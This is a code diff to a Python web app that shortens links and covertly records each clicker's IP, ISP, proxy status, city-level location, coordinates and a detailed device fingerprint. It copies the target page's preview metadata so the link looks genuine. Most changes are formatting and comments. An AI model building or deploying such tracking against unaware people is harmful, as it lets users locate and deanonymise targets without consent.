@@ -13,7 +13,7 @@ import os
 
 import httpx
 from bs4 import BeautifulSoup
-from user_agents import parse as ua_parse  # pip install pyyaml ua-parser user-agents
+from user_agents import parse as ua_parse  # pip install user-agents
 
 # Environment config
 BITLY_TOKEN = os.getenv("BITLY_TOKEN")
@@ -24,7 +24,6 @@ templates = Jinja2Templates(directory="templates")
 
 DB_PATH = "links.db"
 SERVICE_URL = "https://q3os-yn89.onrender.com"
-
 
 def init_db():
     conn = sqlite3.connect(DB_PATH)
@@ -64,10 +63,12 @@ def init_db():
       capture_hardware_concurrency INTEGER DEFAULT 0,
       capture_connection INTEGER DEFAULT 0,
       capture_battery INTEGER DEFAULT 0,
+      capture_level INTEGER DEFAULT 0,
       capture_timezone INTEGER DEFAULT 0,
       capture_local_time INTEGER DEFAULT 0,
       capture_referrer INTEGER DEFAULT 0
-    )""")
+    )
+    """)
 
     # visits table
     c.execute("""
@@ -103,28 +104,25 @@ def init_db():
       local_time TEXT,
       referrer TEXT,
       timestamp TEXT
-    )""")
+    )
+    """)
 
     conn.commit()
     conn.close()
-
 
 @app.on_event("startup")
 async def startup():
     init_db()
 
-
 def generate_code(length: int = 6) -> str:
     alphabet = string.ascii_letters + string.digits
     return ''.join(random.choices(alphabet, k=length))
-
 
 async def shorten_with_tinyurl(url: str) -> str:
     api_url = f"http://tinyurl.com/api-create.php?url={url}"
     async with httpx.AsyncClient(timeout=5.0) as client:
         resp = await client.get(api_url)
         return resp.text if resp.status_code == 200 else url
-
 
 async def shorten_with_bitly(url: str) -> str:
     if not BITLY_TOKEN:
@@ -135,13 +133,11 @@ async def shorten_with_bitly(url: str) -> str:
         resp = await client.post("https://api-ssl.bitly.com/v4/shorten", json=payload, headers=headers)
         if resp.status_code == 200:
             return resp.json().get("link", url)
-        return url
-
+    return url
 
 @app.get("/", response_class=HTMLResponse)
 async def read_root(request: Request):
     return templates.TemplateResponse("index.html", {"request": request})
-
 
 @app.post("/create", response_class=HTMLResponse)
 async def create_link(
@@ -176,6 +172,7 @@ async def create_link(
     capture_local_time: str = Form(None),
     capture_referrer: str = Form(None),
 ):
+    # choose or generate code
     if shortener == "random":
         code = generate_code()
     elif shortener in ("tinyurl", "bitly"):
@@ -183,6 +180,7 @@ async def create_link(
     else:
         code = shortener
 
+    # fetch OpenGraph metadata
     og_title = og_description = og_image = ""
     try:
         async with httpx.AsyncClient(timeout=5.0) as client:
@@ -197,6 +195,7 @@ async def create_link(
     except Exception:
         pass
 
+    # build flags dict
     flags = {k: bool(v) for k, v in {
         'capture_ip': capture_ip,
         'capture_host': capture_host,
@@ -271,7 +270,6 @@ async def create_link(
         "short_url": short_url
     })
 
-
 @app.get("/{code}", response_class=HTMLResponse)
 async def redirect_to_target(
     request: Request,
@@ -282,17 +280,15 @@ async def redirect_to_target(
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("""
-      SELECT
-        id, target, og_title, og_description, og_image,
-        capture_ip, capture_host, capture_provider, capture_proxy,
-        capture_continent, capture_country, capture_region, capture_city, capture_latlong,
-        capture_browser, capture_os,
-        capture_user_agent, capture_language, capture_platform, capture_cookies,
-        capture_screen_width, capture_screen_height, capture_viewport_width,
-        capture_viewport_height, capture_color_depth, capture_device_memory,
-        capture_hardware_concurrency, capture_connection, capture_battery,
-        capture_timezone, capture_local_time, capture_referrer
-      FROM links WHERE code=?
+    SELECT
+      id, target, og_title, og_description, og_image,
+      capture_ip, capture_host, capture_provider, capture_proxy,
+      capture_continent, capture_country, capture_region, capture_city, capture_latlong,
+      capture_browser, capture_os, capture_user_agent, capture_language, capture_platform,
+      capture_cookies, capture_screen_width, capture_screen_height, capture_viewport_width,
+      capture_viewport_height, capture_color_depth, capture_device_memory, capture_hardware_concurrency,
+      capture_connection, capture_battery, capture_timezone, capture_local_time, capture_referrer
+    FROM links WHERE code=?
     """, (code,))
     row = c.fetchone()
     if not row:
@@ -303,13 +299,12 @@ async def redirect_to_target(
       link_id, target, og_title, og_description, og_image,
       cap_ip, cap_host, cap_provider, cap_proxy,
       cap_continent, cap_country, cap_region, cap_city, cap_latlong,
-      cap_browser, cap_os,
-      cap_ua, cap_lang, cap_platform, cap_cookies,
+      cap_browser, cap_os, cap_ua, cap_lang, cap_platform, cap_cookies,
       cap_sw, cap_sh, cap_vw, cap_vh, cap_cd,
-      cap_dm, cap_hc, cap_conn, cap_batt,
-      cap_tz, cap_lt, cap_referrer
+      cap_dm, cap_hc, cap_conn, cap_batt, cap_tz, cap_lt, cap_referrer
     ) = row
 
+    # determine IP
     if x_real_ip:
         ip = x_real_ip.strip()
     elif x_forwarded_for:
@@ -317,9 +312,11 @@ async def redirect_to_target(
     else:
         ip = request.client.host or ""
 
+    # parse UA
     ua_string = request.headers.get("user-agent", "")
     ua = ua_parse(ua_string)
 
+    # resolve host
     host = ""
     if cap_host:
         try:
@@ -327,6 +324,7 @@ async def redirect_to_target(
         except:
             host = ""
 
+    # geolocation
     country = region = city = continent = provider = proxy = latlong = ""
     need_geo = any([
         cap_provider, cap_proxy, cap_continent,
@@ -369,12 +367,12 @@ async def redirect_to_target(
 
     c.execute("""
       INSERT INTO visits
-        (link_id, ip, host, provider, proxy, continent, country, region, city, latlong,
-         browser, os, timestamp)
+        (link_id, ip, host, provider, proxy, continent, country, region,
+         city, latlong, browser, os, timestamp)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     """, (
-      link_id, ip, host, provider, proxy, continent, country, region, city, latlong,
-      browser, os_str, timestamp
+      link_id, ip, host, provider, proxy, continent, country, region,
+      city, latlong, browser, os_str, timestamp
     ))
     conn.commit()
     conn.close()
@@ -394,7 +392,6 @@ async def redirect_to_target(
         "batt": cap_batt, "tz": cap_tz, "lt": cap_lt, "ref": cap_referrer
       }
     })
-
 
 @app.post("/collect")
 async def collect_data(request: Request):
@@ -429,7 +426,6 @@ async def collect_data(request: Request):
     conn.close()
     return {"status": "ok"}
 
-
 @app.get("/track/{code}", response_class=HTMLResponse)
 async def track(request: Request, code: str):
     conn = sqlite3.connect(DB_PATH)
@@ -444,8 +440,7 @@ async def track(request: Request, code: str):
     c.execute("""
       SELECT
         ip, host, provider, proxy, continent, country, region, city, latlong,
-        browser, os,
-        user_agent, language, platform, cookies_enabled,
+        browser, os, user_agent, language, platform, cookies_enabled,
         screen_width, screen_height, viewport_width, viewport_height,
         color_depth, device_memory, hardware_concurrency,
         connection, battery_charging, battery_level,
@@ -462,7 +457,6 @@ async def track(request: Request, code: str):
       {"request": request, "code": code, "visits": visits}
     )
 
-
 @app.get("/api/visit-metadata/{code}")
 async def visit_metadata(code: str):
     conn = sqlite3.connect(DB_PATH)
@@ -472,11 +466,9 @@ async def visit_metadata(code: str):
     conn.close()
     return {"count": count}
 
-
 @app.get("/ping")
 async def ping():
     return {"status": "alive"}
-
 
 @app.on_event("startup")
 async def schedule_ping_task():
